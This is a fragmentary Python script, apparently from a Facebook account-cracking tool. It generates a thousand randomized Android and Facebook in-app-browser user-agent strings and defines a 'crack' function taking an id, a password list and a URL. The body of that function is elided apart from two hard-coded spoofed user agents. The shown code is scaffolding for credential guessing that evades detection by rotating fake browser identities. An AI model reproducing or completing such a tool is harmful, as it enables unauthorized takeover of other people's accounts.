...
for x in range(1000):
	rr = random.randint
	rc = random.choice
	A = f'Mozilla/5.0 (Linux; Android 12; {str(rr(8,10))}; CPH2159 Build/SKQ1.210216.001; wv) {str(rr(4,9))} CPH2159 Build/'
	B = f'{str(rr(111111,199999))}.1.210216.001; wv) AppleWebKit/537.36 '
	C = f'(KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.79{str(rr(1111,9999))}.136 Mobile Safari'
	D = f'Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]{str(rr(11111,99999))}AP'
	se = f'{A}{B}{C}{D}'
	if se in redmi:pass
...
def crack(idf,pwx,url,awal):
	...
	ua = 'Mozilla/5.0 (Linux; Android 9; octopus Build/R96-14268.51.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Safari/537.36 [FB_IAB/FB4A;FBAV/347.0.0.28.237;]'
	ua = 'Dalvik/2.1.0 (Linux; U; Android 13; SM-F721U1 Build/TP1A.220624.014)'
